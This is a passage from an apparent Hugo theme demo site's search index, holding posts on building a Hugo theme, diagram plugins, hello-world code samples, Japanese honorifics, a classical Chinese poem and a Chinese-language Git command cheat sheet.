to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026quot;tag\u0026quot;:\u0026quot;tags\u0026quot;, \u0026quot;category\u0026quot;:\u0026quot;categories\u0026quot;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name '*.html' | xargs ls -l -rw-r--r-- 1 quoha staff 149 Sep 29 22:44 public/index.html -rw-r--r-- 1 quoha staff 125 Sep 29 22:44 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:44 public/post/index.html -rw-r--r-- 1 quoha staff 128 Sep 29 22:44 public/post/second/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;/post/second/\u0026quot;\u0026gt;second\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;/post/first/\u0026quot;\u0026gt;first\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $  Create a Post Listing We have the posts displaying on the home page and on their own page. We also have a file public/post/index.html that is empty. Let\u0026rsquo;s make it show a list of all posts (not just the first ten).\nWe need to decide which template to update. This will be a listing, so it should be a list template. Let\u0026rsquo;s take a quick look and see which list templates are available.\n$ find themes/zafta -name list.html | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html  As with the single post, we have to decide to update _default/list.html or create post/list.html. We still don\u0026rsquo;t have multiple content types, so let\u0026rsquo;s stay consistent and update the default list template.\nCreating Top Level Pages Let\u0026rsquo;s add an \u0026ldquo;about\u0026rdquo; page and display it at the top level (as opposed to a sub-level like we did with posts).\nThe default in Hugo is to use the directory structure of the content/ directory to guide the location of the generated html in the public/ directory. Let\u0026rsquo;s verify that by creating an \u0026ldquo;about\u0026rdquo; page at the top level:\n$ vi content/about.md +++ title = \u0026quot;about\u0026quot; description = \u0026quot;about this site\u0026quot; date = \u0026quot;2014-09-27\u0026quot; slug = \u0026quot;about time\u0026quot; +++ ## about us i'm speechless :wq  Generate the web site and verify the results.\n$ find public -name '*.html' | xargs ls -l -rw-rw-r-- 1 mdhender staff 334 Sep 27 15:08 public/about-time/index.html -rw-rw-r-- 1 mdhender staff 527 Sep 27 15:08 public/index.html -rw-rw-r-- 1 mdhender staff 358 Sep 27 15:08 public/post/first-post/index.html -rw-rw-r-- 1 mdhender staff 0 Sep 27 15:08 public/post/index.html -rw-rw-r-- 1 mdhender staff 342 Sep 27 15:08 public/post/second-post/index.html  Notice that the page wasn\u0026rsquo;t created at the top level. It was created in a sub-directory named \u0026lsquo;about-time/\u0026rsquo;. That name came from our slug. Hugo will use the slug to name the generated content. It\u0026rsquo;s a reasonable default, by the way, but we can learn a few things by fighting it for this file.\nOne other thing. Take a look at the home page.\n$ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;http://localhost:1313/post/theme/\u0026quot;\u0026gt;creating a new theme\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;http://localhost:1313/about-time/\u0026quot;\u0026gt;about\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;http://localhost:1313/post/second-post/\u0026quot;\u0026gt;second\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026quot;http://localhost:1313/post/first-post/\u0026quot;\u0026gt;first\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt;document.write('\u0026lt;script src=\u0026quot;http://' + (location.host || 'localhost').split(':')[0] + ':1313/livereload.js?mindelay=10\u0026quot;\u0026gt;\u0026lt;/' + 'script\u0026gt;')\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Notice that the \u0026ldquo;about\u0026rdquo; link is listed with the posts? That\u0026rsquo;s not desirable, so let\u0026rsquo;s change that first.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;posts\u0026lt;/h1\u0026gt; {{ range first 10 .Data.Pages }} {{ if eq .Type \u0026quot;post\u0026quot;}} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;h1\u0026gt;pages\u0026lt;/h1\u0026gt; {{ range .Data.Pages }} {{ if eq .Type \u0026quot;page\u0026quot; }} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq  Generate the web site and verify the results. The home page has two sections, posts and pages, and each section has the right set of headings and links in it.\nBut, that about page still renders to about-time/index.html.\n$ find public -name '*.html' | xargs ls -l -rw-rw-r-- 1 mdhender staff 334 Sep 27 15:33 public/about-time/index.html -rw-rw-r-- 1 mdhender staff 645 Sep 27 15:33 public/index.html -rw-rw-r-- 1 mdhender staff 358 Sep 27 15:33 public/post/first-post/index.html -rw-rw-r-- 1 mdhender staff 0 Sep 27 15:33 public/post/index.html -rw-rw-r-- 1 mdhender staff 342 Sep 27 15:33 public/post/second-post/index.html  Knowing that hugo is using the slug to generate the file name, the simplest solution is to change the slug. Let\u0026rsquo;s do it the hard way and change the permalink in the configuration file.\n$ vi config.toml [permalinks] page = \u0026quot;/:title/\u0026quot; about = \u0026quot;/:filename/\u0026quot;  Generate the web site and verify that this didn\u0026rsquo;t work. Hugo lets \u0026ldquo;slug\u0026rdquo; or \u0026ldquo;URL\u0026rdquo; override the permalinks setting in the configuration file. Go ahead and comment out the slug in content/about.md, then generate the web site to get it to be created in the right place.\nSharing Templates If you\u0026rsquo;ve been following along, you probably noticed that posts have titles in the browser and the home page doesn\u0026rsquo;t. That\u0026rsquo;s because we didn\u0026rsquo;t put the title in the home page\u0026rsquo;s template (layouts/index.html). That\u0026rsquo;s an easy thing to do, but let\u0026rsquo;s look at a different option.\nWe can put the common bits into a shared template that\u0026rsquo;s stored in the themes/zafta/layouts/partials/ directory.\nCreate the Header and Footer Partials In Hugo, a partial is a sugar-coated template. Normally a template reference has a path specified. Partials are different. Hugo searches for them along a TODO defined search path. This makes it easier for end-users to override the theme\u0026rsquo;s presentation.\n$ vi themes/zafta/layouts/partials/header.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; :wq $ vi themes/zafta/layouts/partials/footer.html \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq  Update the Home Page Template to Use the Partials The most noticeable difference between a template call and a partials call is the lack of path:\n{{ template \u0026quot;theme/partials/header.html\u0026quot; . }}  versus\n{{ partial \u0026quot;header.html\u0026quot; . }}  Both pass in the context.\nLet\u0026rsquo;s change the home page template to use these new partials.\n$ vi themes/zafta/layouts/index.html {{ partial \u0026quot;header.html\u0026quot; . }} \u0026lt;h1\u0026gt;posts\u0026lt;/h1\u0026gt; {{ range first 10 .Data.Pages }} {{ if eq .Type \u0026quot;post\u0026quot;}} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;h1\u0026gt;pages\u0026lt;/h1\u0026gt; {{ range .Data.Pages }} {{ if or (eq .Type \u0026quot;page\u0026quot;) (eq .Type \u0026quot;about\u0026quot;) }} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ .Type }} - {{ .Title }} - {{ .RelPermalink }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} {{ partial \u0026quot;footer.html\u0026quot; . }} :wq  Generate the web site and verify the results. The title on the home page is now \u0026ldquo;your title here\u0026rdquo;, which comes from the \u0026ldquo;title\u0026rdquo; variable in the config.toml file.\nUpdate the Default Single Template to Use the Partials $ vi themes/zafta/layouts/_default/single.html {{ partial \u0026quot;header.html\u0026quot; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} {{ partial \u0026quot;footer.html\u0026quot; . }} :wq  Generate the web site and verify the results. The title on the posts and the about page should both reflect the value in the markdown file.\nAdd “Date Published” to Posts It\u0026rsquo;s common to have posts display the date that they were written or published, so let\u0026rsquo;s add that. The front matter of our posts has a variable named \u0026ldquo;date.\u0026rdquo; It\u0026rsquo;s usually the date the content was created, but let\u0026rsquo;s pretend that\u0026rsquo;s the value we want to display.\nAdd “Date Published” to the Template We\u0026rsquo;ll start by updating the template used to render the posts. The template code will look like:\n{{ .Date.Format \u0026quot;Mon, Jan 2, 2006\u0026quot; }}  Posts use the default single template, so we\u0026rsquo;ll change that file.\n$ vi themes/zafta/layouts/_default/single.html {{ partial \u0026quot;header.html\u0026quot; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;{{ .Date.Format \u0026quot;Mon, Jan 2, 2006\u0026quot; }}\u0026lt;/h2\u0026gt; {{ .Content }} {{ partial \u0026quot;footer.html\u0026quot; . }} :wq  Generate the web site and verify the results. The posts now have the date displayed in them. There\u0026rsquo;s a problem, though. The \u0026ldquo;about\u0026rdquo; page also has the date displayed.\nAs usual, there are a couple of ways to make the date display only on posts. We could do an \u0026ldquo;if\u0026rdquo; statement like we did on the home page. Another way would be to create a separate template for posts.\nThe \u0026ldquo;if\u0026rdquo; solution works for sites that have just a couple of content types. It aligns with the principle of \u0026ldquo;code for today,\u0026rdquo; too.\nLet\u0026rsquo;s assume, though, that we\u0026rsquo;ve made our site so complex that we feel we have to create a new template type. In Hugo-speak, we\u0026rsquo;re going to create a section template.\nLet\u0026rsquo;s restore the default single template before we forget.\n$ mkdir themes/zafta/layouts/post $ vi themes/zafta/layouts/_default/single.html {{ partial \u0026quot;header.html\u0026quot; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} {{ partial \u0026quot;footer.html\u0026quot; . }} :wq  Now we\u0026rsquo;ll update the post\u0026rsquo;s version of the single template. If you remember Hugo\u0026rsquo;s rules, the template engine will use this version over the default.\n$ vi themes/zafta/layouts/post/single.html {{ partial \u0026quot;header.html\u0026quot; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;{{ .Date.Format \u0026quot;Mon, Jan 2, 2006\u0026quot; }}\u0026lt;/h2\u0026gt; {{ .Content }} {{ partial \u0026quot;footer.html\u0026quot; . }} :wq  Note that we removed the date logic from the default template and put it in the post template. Generate the web site and verify the results. Posts have dates and the about page doesn\u0026rsquo;t.\nDon\u0026rsquo;t Repeat Yourself DRY is a good design goal and Hugo does a great job supporting it. Part of the art of a good template is knowing when to add a new template and when to update an existing one. While you\u0026rsquo;re figuring that out, accept that you\u0026rsquo;ll be doing some refactoring. Hugo makes that easy and fast, so it\u0026rsquo;s okay to delay splitting up a template.\n","permalink":"http://localhost:8000/public/post/preview-english/","tags":["English"],"title":"[English] Creating a New Theme"},{"categories":["Even theme preview"],"contents":"Usage st=\u0026gt;start: Start|past:\u0026gt;http://www.google.com[blank] e=\u0026gt;end: End:\u0026gt;http://www.google.com op1=\u0026gt;operation: My Operation|past op2=\u0026gt;operation: Stuff|current sub1=\u0026gt;subroutine: My Subroutine|invalid cond=\u0026gt;condition: Yes or No?|approved:\u0026gt;http://www.google.com c2=\u0026gt;condition: Good idea|rejected io=\u0026gt;inputoutput: catch something...|request st-\u0026gt;op1(right)-\u0026gt;cond cond(yes, right)-\u0026gt;c2 cond(no)-\u0026gt;sub1(left)-\u0026gt;op1 c2(yes)-\u0026gt;io-\u0026gt;e c2(no)-\u0026gt;op2-\u0026gt;e  \n```flowchart st=\u0026gt;start: Start|past:\u0026gt;http://www.google.com[blank] e=\u0026gt;end: End:\u0026gt;http://www.google.com op1=\u0026gt;operation: My Operation|past op2=\u0026gt;operation: Stuff|current sub1=\u0026gt;subroutine: My Subroutine|invalid cond=\u0026gt;condition: Yes or No?|approved:\u0026gt;http://www.google.com c2=\u0026gt;condition: Good idea|rejected io=\u0026gt;inputoutput: catch something...|request st-\u0026gt;op1(right)-\u0026gt;cond cond(yes, right)-\u0026gt;c2 cond(no)-\u0026gt;sub1(left)-\u0026gt;op1 c2(yes)-\u0026gt;io-\u0026gt;e c2(no)-\u0026gt;op2-\u0026gt;e ```  Configuration Configure for all home and regular pages:\n[params.flowchartDiagrams] enable = true options = \u0026quot;\u0026quot;  Configure for a single post in the front matter (Params in front matter have higher precedence):\nflowchartDiagrams: enable: true options: \u0026quot;{ 'x': 0, 'y': 0, 'line-width': 3, 'line-length': 50, 'text-margin': 10, 'font-size': 14, 'font-color': 'black', 'line-color': 'black', 'element-color': 'black', 'fill': 'white', 'yes-text': 'yes', 'no-text': 'no', 'arrow-end': 'block', 'scale': 1, 'i-am-a-comment-1': 'Do not use /​/!', 'i-am-a-comment-2': 'style symbol types', 'symbols': { 'start': { 'font-color': 'red', 'element-color': 'green', 'fill': 'yellow' }, 'end': { 'class': 'end-element' } }, 'i-am-a-comment-3': 'even flowstate support ;-)', 'flowstate': { 'request': {'fill': 'blue'} } }\u0026quot;  See more information from https://github.com/adrai/flowchart.js.\n","permalink":"http://localhost:8000/public/post/preview-js-flowchart-diagrams/","tags":null,"title":"JS Flowchart Diagrams"},{"categories":["Even theme preview"],"contents":"Usage Andrew-\u0026gt;China: Says Hello Note right of China: China thinks\\nabout it China--\u0026gt;Andrew: How are you? Andrew-\u0026gt;\u0026gt;China: I am good thanks!  \n```sequence Andrew-\u0026gt;China: Says Hello Note right of China: China thinks\\nabout it China--\u0026gt;Andrew: How are you? Andrew-\u0026gt;\u0026gt;China: I am good thanks! ```  Configuration Configure for all home and regular pages:\n[params.sequenceDiagrams] enable = true options = \u0026quot;{theme: 'hand'}\u0026quot;  Configure for a single post in the front matter (Params in front matter have higher precedence):\nsequenceDiagrams: enable: true options: \u0026quot;{theme: 'hand'}\u0026quot;  Options options = { // Change the styling of the diagram, typically one of 'simple', 'hand'. New themes can be registered with registerTheme(...). theme: string, // CSS style to apply to the diagram's svg tag. (Only supported if using snap.svg) css_class: string, }  See more information from https://github.com/bramp/js-sequence-diagrams.\nExamples Title: Here is a title A-\u0026gt;B: Normal line B--\u0026gt;C: Dashed line C-\u0026gt;\u0026gt;D: Open arrow D--\u0026gt;\u0026gt;A: Dashed open arrow  ```sequence Title: Here is a title A-\u0026gt;B: Normal line B--\u0026gt;C: Dashed line C-\u0026gt;\u0026gt;D: Open arrow D--\u0026gt;\u0026gt;A: Dashed open arrow ```  # Example of a comment. Note left of A: Note to the\\n left of A Note right of A: Note to the\\n right of A Note over A: Note over A Note over A,B: Note over both A and B  ```sequence # Example of a comment. Note left of A: Note to the\\n left of A Note right of A: Note to the\\n right of A Note over A: Note over A Note over A,B: Note over both A and B ``` ","permalink":"http://localhost:8000/public/post/preview-js-sequence-diagrams/","tags":null,"title":"JS Sequence Diagrams"},{"categories":["Even theme preview"],"contents":" Add Some Content add an article [my-first-post.md] to folder [post] $ hugo new post/my-first-post.md add a new menu [about] $ hugo new about.md  Edit the newly created content file if you want. Now, start the Hugo server with drafts enabled:\n$ hugo server -D Started building sites ... Built site for language en: 1 of 1 draft rendered 0 future content 0 expired content 1 regular pages created 8 other pages created 0 non-page files copied 1 paginator pages created 0 categories created 0 tags created total in 18 ms Watching for changes in /Users/bep/sites/quickstart/{data,content,layouts,static,themes} Serving pages from memory Web Server is available at http://localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop  ","permalink":"http://localhost:8000/public/post/preview-hugo-usages/","tags":["hugo usages"],"title":"hugo usages"},{"categories":["Even theme preview"],"contents":"function helloWorld () { alert(\u0026quot;Hello, World!\u0026quot;) }  \npublic class HelloWorld { public static void main(String[] args) { System.out.println(\u0026quot;Hello, World!\u0026quot;); } }  package hello fun main(args: Array\u0026lt;String\u0026gt;) { println(\u0026quot;Hello World!\u0026quot;) }  #include \u0026lt;stdio.h\u0026gt; /* Hello */ int main(void){ printf(\u0026quot;Hello, World!\u0026quot;); return 0; }  // 'Hello World!' program #include \u0026lt;iostream\u0026gt; int main(){ std::cout \u0026lt;\u0026lt; \u0026quot;Hello World!\u0026quot; \u0026lt;\u0026lt; std::endl; return 0; }  using System; class HelloWorld{ public static void Main(){ System.Console.WriteLine(\u0026quot;Hello, World!\u0026quot;); } }  \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; Hello, World! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  package main import fmt \u0026quot;fmt\u0026quot; func main() { fmt.Printf(\u0026quot;Hello, World!\\n\u0026quot;); }  object HelloWorld with Application { Console.println(\u0026quot;Hello, World!\u0026quot;); }  \u0026lt;?php echo 'Hello, World!'; ?\u0026gt;  print(\u0026quot;Hello, World!\u0026quot;) ","permalink":"http://localhost:8000/public/post/preview-syntax-highlighting/","tags":["Syntax Highlighting"],"title":"Syntax Highlighting"},{"categories":["Even theme preview"],"contents":"  日本語の敬語体系は、一般に、大きく尊敬語・謙譲語・丁寧語に分類される。文化審議会国語分科会は、2007年2月に「敬語の指針」を答申し、これに丁重語および美化語を含めた5分類を示している。\n 尊敬語 尊敬語は、動作の主体を高めることで、主体への敬意を表す言い方である。動詞に「お（ご）～になる」を付けた形、また、助動詞「（ら）れる」を付けた形などが用いられる。たとえば、動詞「取る」の尊敬形として、「（先生が）お取りになる」「（先生が）取られる」などが用いられる。\n語によっては、特定の尊敬語が対応するものもある。たとえば、「言う」の尊敬語は「おっしゃる」、「食べる」の尊敬語は「召し上がる」、「行く・来る・いる」の尊敬語は「いらっしゃる」である。\n謙譲語 謙譲語は、古代から基本的に動作の客体への敬意を表す言い方であり、現代では「動作の主体を低める」と解釈するほうがよい場合がある。動詞に「お～する」「お～いたします」（謙譲語＋丁寧語）をつけた形などが用いられる。たとえば、「取る」の謙譲形として、「お取りする」などが用いられる。\n語によっては、特定の謙譲語が対応するものもある。たとえば、「言う」の謙譲語は「申し上げる」、「食べる」の謙譲語は「いただく」、「（相手の所に）行く」の謙譲語は「伺う」「参上する」「まいる」である。\nなお、「夜も更けてまいりました」の「まいり」など、謙譲表現のようでありながら、誰かを低めているわけではない表現がある。これは、「夜も更けてきた」という話題を丁重に表現することによって、聞き手への敬意を表すものである。宮地裕は、この表現に使われる語を、特に「丁重語」と称している[104][105]。丁重語にはほかに「いたし（マス）」「申し（マス）」「存じ（マス）」「小生」「小社」「弊社」などがある。文化審議会の「敬語の指針」でも、「明日から海外へまいります」の「まいり」のように、相手とは関りのない自分側の動作を表現する言い方を丁重語としている。\n丁寧語 丁寧語は、文末を丁寧にすることで、聞き手への敬意を表すものである。動詞・形容詞の終止形で終わる常体に対して、名詞・形容動詞語幹などに「です」を付けた形（「学生です」「きれいです」）や、動詞に「ます」をつけた形（「行きます」「分かりました」）等の丁寧語を用いた文体を敬体という。\n一般に、目上の人には丁寧語を用い、同等・目下の人には丁寧語を用いないといわれる。しかし、実際の言語生活に照らして考えれば、これは事実ではない。母が子を叱るとき、「お母さんはもう知りませんよ」と丁寧語を用いる場合ももある。丁寧語が用いられる多くの場合は、敬意や謝意の表現とされるが、、稀に一歩引いた心理的な距離をとろうとする場合もある。\n「お弁当」「ご飯」などの「お」「ご」も、広い意味では丁寧語に含まれるが、宮地裕は特に「美化語」と称して区別する[104][105]。相手への丁寧の意を示すというよりは、話し手が自分の言葉遣いに配慮した表現である。したがって、「お弁当食べようよ。」のように、丁寧体でない文でも美化語を用いることがある。文化審議会の「敬語の指針」でも「美化語」を設けている。\n","permalink":"http://localhost:8000/public/post/preview-japanese/","tags":["日本語"],"title":"[日本語] 敬語体系"},{"categories":["Even theme preview"],"contents":"  《长恨歌》是中国唐朝诗人白居易的一首长篇叙事诗。\n 第一段：贵妃受宠爱 汉皇重色思倾国，御宇多年求不得。杨家有女初长成，养在深闺人未识。\n天生丽质难自弃，一朝选在君王侧。回眸一笑百媚生，六宫粉黛无颜色。\n春寒赐浴华清池，温泉水滑洗凝脂。侍儿扶起娇无力，始是新承恩泽时。\n云鬓花颜金步摇，芙蓉帐暖度春宵。春宵苦短日高起，从此君王不早朝。\n承欢侍宴无闲暇，春从春游夜专夜。后宫佳丽三千人，三千宠爱在一身。\n金屋妆成娇侍夜，玉楼宴罢醉和春。姊妹弟兄皆列士，可怜光彩生门户。\n遂令天下父母心，不重生男重生女。骊宫高处入青云，仙乐风飘处处闻。\n缓歌慢舞凝丝竹，尽日君王看不足。渔阳鼙鼓动地来，惊破霓裳羽衣曲。\n第二段：马嵬惊变 九重城阙烟尘生，千乘万骑西南行。翠华摇摇行复止，西出都门百余里。\n六军不发无奈何，宛转蛾眉马前死。花钿委地无人收，翠翘金雀玉搔头。\n君王掩面救不得，回看血泪相和流。黄埃散漫风萧索，云栈萦纡登剑阁。\n峨嵋山下少人行，旌旗无光日色薄。蜀江水碧蜀山青，圣主朝朝暮暮情。\n行宫见月伤心色，夜雨闻铃肠断声。\n第三段：玄宗皇帝思念 天旋地转回龙驭，到此踌躇不能去。马嵬坡下泥土中，不见玉颜空死处。\n君臣相顾尽霑衣，东望都门信马归。归来池苑皆依旧，太液芙蓉未央柳。\n芙蓉如面柳如眉，对此如何不泪垂。春风桃李花开日，秋雨梧桐叶落时。\n西宫南内多秋草，落叶满阶红不扫。梨园弟子白发新，椒房阿监青娥老。\n夕殿萤飞思悄然，孤灯挑尽未成眠。迟迟钟鼓初长夜，耿耿星河欲曙天。\n鸳鸯瓦冷霜华重，翡翠衾寒谁与共。悠悠生死别经年，魂魄不曾来入梦。\n第四段：仙界寻妃 临邛道士鸿都客，能以精诚致魂魄。为感君王辗转思，遂教方士殷勤觅。\n排空驭气奔如电，升天入地求之遍。上穷碧落下黄泉，两处茫茫皆不见。\n忽闻海上有仙山，山在虚无缥缈间。楼阁玲珑五云起，其中绰约多仙子。\n中有一人字太真，雪肤花貌参差是。金阙西厢叩玉扃，转教小玉报双成。\n闻道汉家天子使，九华帐里梦魂惊。揽衣推枕起徘徊，珠箔银屏迤逦开。\n云髻(鬓?)半偏新睡觉，花冠不整下堂来。风吹仙袂飘飘(飖)举，犹似霓裳羽衣舞。\n玉容寂寞泪阑干，梨花一枝春带雨。含情凝睇谢君王，一别音容两渺茫。\n昭阳殿里恩爱绝，蓬莱宫中日月长。回头下望人寰处，不见长安见尘雾。\n唯将旧物表深情，钿合金钗寄将去。钗留一股合一扇，钗擘黄金合分钿。\n但教心似金钿坚，天上人间会相见。临别殷勤重寄词，词中有誓两心知。\n七月七日长生殿，夜半无人私语时。在天愿作比翼鸟，在地愿为连理枝。\n天长地久有时尽，此恨绵绵无绝期。\n","permalink":"http://localhost:8000/public/post/preview-chinese/","tags":["中文"],"title":"[中文] 《长恨歌》"},{"categories":["Front-End","搬运整理"],"contents":"  声明：资料来源互联网\n 安装  在 Windows 上安装 Git 同样轻松，有个叫做 msysGit 的项目提供了安装包。\n 完成安装之后，就可以使用命令行的 git 工具（已经自带了 ssh 客户端）了，另外还有一个图形界面的 Git 项目管理工具。\n  配置  首先是配置帐号信息  git config -e [--global] # 编辑Git配置文件 git config --global user.name yanhaijing git config --global user.email yanhaijing@yeah.net git config --list #查看配置的信息 git help config #获取帮助信息   配置自动换行（自动转换坑太大）  git config --global core.autocrlf input #提交到git是自动将换行符转换为lf   配置密钥  ssh-keygen -t rsa -C yanhaijing@yeah.net #生成密钥 ssh -T git@github.com #测试是否成功   配置别名，git的命令没有自动完成功能，有点坑哈，别名派上了用场  git config --global alias.st status #git st git config --global alias.co checkout #git co git config --global alias.br branch #git br git config --global alias.ci commit #git ci  新建仓库 git init #初始化 git status #获取状态 git add [file1] [file2] ... #.或*代表全部添加 git commit -m \u0026quot;message\u0026quot; #此处注意乱码 git remote add origin git@github.com:yanhaijing/test.git #添加源 git push -u origin master #push同事设置默认跟踪分支  从现有仓库克隆 git clone git://github.com/yanhaijing/data.js.git git clone git://github.com/schacon/grit.git mypro #克隆到自定义文件夹  本地 git add * # 跟踪新文件 git add -u [path] # 添加[指定路径下]已跟踪文件 rm *\u0026amp;git rm * # 移除文件 git rm -f * # 移除文件 git rm --cached * # 停止追踪指定文件，但该文件会保留在工作区 git mv file_from file_to # 重命名跟踪文件 git log # 查看提交记录 git commit # 提交更新 git commit [file1] [file2] ... # 提交指定文件 git commit -m 'message' git commit -a # 跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交 git commit --amend #修改最后一次提交 git commit -v # 提交时显示所有diff信息 git reset HEAD * #取消已经暂存的文件 git reset --mixed HEAD * #同上 git reset --soft HEAD * #重置到指定状态，不会修改索引区和工作树 git reset --hard HEAD * #重置到指定状态，会修改索引区和工作树 git reset -- files #重置index区文件 git revert HEAD #撤销前一次操作 git revert HEAD~ #撤销前前一次操作 git revert commit #撤销指定操作 git checkout -- file #取消对文件的修改（从暂存区——覆盖worktree file） git checkout branch|tag|commit -- file_name #从仓库取出file覆盖当前分支 git checkout -- . #从暂存区取出文件覆盖工作区 git diff file #查看指定文件的差异 git diff --stat #查看简单的diff结果 git diff #比较Worktree和Index之间的差异 git diff --cached #比较Index和HEAD之间的差异 git diff HEAD #比较Worktree和HEAD之间的差异 git diff branch #比较Worktree和branch之间的差异 git diff branch1 branch2 #比较两次分支之间的差异 git diff commit commit #比较两次提交之间的差异 git log #查看最近的提交日志 git log --pretty=oneline #单行显示提交日志 git log --graph # 图形化显示 git log --abbrev-commit # 显示log id的缩写 git log -num #显示第几条log（倒数） git log --stat # 显示commit历史，以及每次commit发生变更的文件 git log --follow [file] # 显示某个文件的版本历史，包括文件改名 git log -p [file] # 显示指定文件相关的每一次diff git stash #将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。 git stash list #查看保存的工作现场 git stash apply #恢复工作现场 git stash drop #删除stash内容 git stash pop #恢复的同时直接删除stash内容 git stash apply stash@{0} #恢复指定的工作现场，当你保存了不只一份工作现场时。  分支 git branch #列出本地分支 git branch -r #列出远端分支 git branch -a #列出所有分支 git branch -v #查看各个分支最后一个提交对象的信息 git branch --merge #查看已经合并到当前分支的分支 git branch --no-merge #查看为合并到当前分支的分支 git branch test #新建test分支 git branch branch [branch|commit|tag] # 从指定位置出新建分支 git branch --track branch remote-branch # 新建一个分支，与指定的远程分支建立追踪关系 git branch -m old new #重命名分支 git branch -d test #删除test分支 git branch -D test #强制删除test分支 git branch --set-upstream dev origin/dev #将本地dev分支与远程dev分支之间建立链接 git checkout test #切换到test分支 git checkout -b test #新建+切换到test分支 git checkout -b test dev #基于dev新建test分支，并切换 git merge test #将test分支合并到当前分支 git merge --squash test #合并压缩，将test上的commit压缩为一条 git cherry-pick commit #拣选合并，将commit合并到当前分支 git cherry-pick -n commit #拣选多个提交，合并完后可以继续拣选下一个提交 git rebase master #将master分之上超前的提交，变基到当前分支 git rebase --onto master 169a6 #限制回滚范围，rebase当前分支从169a6以后的提交 git rebase --interactive #交互模式 git rebase --continue #处理完冲突继续合并 git rebase --skip #跳过 git rebase --abort #取消合并  远端 git fetch origin remotebranch[:localbranch] # 从远端拉去分支[到本地指定分支] git merge origin/branch #合并远端上指定分支 git pull origin remotebranch:localbranch #拉去远端分支到本地分支 git push origin branch #将当前分支，推送到远端上指定分支 git push origin localbranch:remotebranch #推送本地指定分支，到远端上指定分支 git push origin :remotebranch #删除远端指定分支 git push origin remotebranch --delete #删除远程分支 git branch -dr branch #删除本地和远程分支 git checkout -b [--track] test origin/dev #基于远端dev分支，新建本地test分支[同时设置跟踪]  源  git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。\n  个人开发时，多源用的可能不多，但多源其实非常有用。  git remote add origin1 git@github.com:yanhaijing/data.js.git git remote #显示全部源 git remote -v #显示全部源+详细信息 git remote rename origin1 origin2 #重命名 git remote rm origin #删除 git remote show origin #查看指定源的全部信息  标签  当开发到一定阶段时，给程序打标签是非常棒的功能。\n git tag #列出现有标签 git tag v0.1 [branch|commit] # [从指定位置]新建标签 git tag -a v0.1 -m 'my version 1.4' #新建带注释标签 git checkout tagname #切换到标签 git push origin v1.5 #推送分支到源上 git push origin --tags #一次性推送所有分支 git tag -d v0.1 #删除标签 git push origin :refs/tags/v0.1 #删除远程标签  ","permalink":"http://localhost:8000/public/post/git-notes/","tags":["Git"],"title":"Git笔记总结篇"},{"categories":["搬运整理"],"contents":" 转载 - Ricky - CSDN博客\nGit常用命令 新建Repository $ git init $ git init [project-name] $ git clone [url]  例如：\n1、创建本地Repository\n$ mkdir pro-git $ cd pro-git $ git init  2、clone 远程Repository\n$ git clone git@github.com:FBing/design-patterns.git  初次运行 Git 前的配置 既然已经在系统上安装了 Git，你会想要做几件事来定制你的 Git 环境。 